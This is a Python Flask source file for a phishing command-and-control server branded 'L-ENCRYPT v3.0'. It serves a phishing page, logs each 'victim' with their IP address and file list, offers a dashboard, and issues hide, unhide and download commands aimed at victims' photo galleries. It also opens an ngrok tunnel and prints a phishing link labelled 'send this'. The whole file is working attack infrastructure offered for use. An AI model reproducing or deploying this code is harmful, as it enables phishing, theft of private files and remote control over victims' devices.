from flask import Flask, render_template, request, jsonify, send_from_directory
from pyngrok import ngrok
import threading
import os

app = Flask(__name__, template_folder='templates', static_folder='static')

# Store victims: victim_id → {name, files[], handle_serialized, ip}
victims = {}

@app.route('/')
def phishing():
    return render_template('phishing.html')

@app.route('/dashboard')
def dashboard():
    return render_template('dashboard.html')

@app.route('/report', methods=['POST'])
def report():
    data = request.json
    victim_id = data['id']
    victims[victim_id] = {
        'id': victim_id,
        'ip': request.remote_addr,
        'files': data['files'],
        'timestamp': data.get('time')
    }
    print(f"\n[+] NEW VICTIM → {victim_id} | IP: {request.remote_addr} | Files: {len(data['files'])}")
    return "ok", 200

@app.route('/api/victims')
def api_victims():
    return jsonify(victims)

@app.route('/api/hide/<victim_id>')
def hide_all(victim_id):
    return jsonify({"command": "hide_all"})

@app.route('/api/unhide/<victim_id>')
def unhide_all(victim_id):
    return jsonify({"command": "unhide_all"})

@app.route('/api/download/<victim_id>/<filename>')
def download_file(victim_id, filename):
    # In real red team you would proxy the file here
    return jsonify({"command": "download", "file": filename})

if __name__ == '__main__':
    print("""
    ╔══════════════════════════════════════════╗
    ║           L-ENCRYPT v3.0 C2 SERVER       ║
    ║       One Link → Full Gallery Control    ║
    ╚══════════════════════════════════════════╝
    """)
    
    # Auto start ngrok tunnel
    public_url = ngrok.connect(5000, "http")
    print(f"[+] PHISHING LINK (send this): {public_url}")
    print(f"[+] DASHBOARD          : {public_url}/dashboard")
    print(f"[+] Waiting for victims...\n")
    
    app.run(host='0.0.0.0', port=5000)
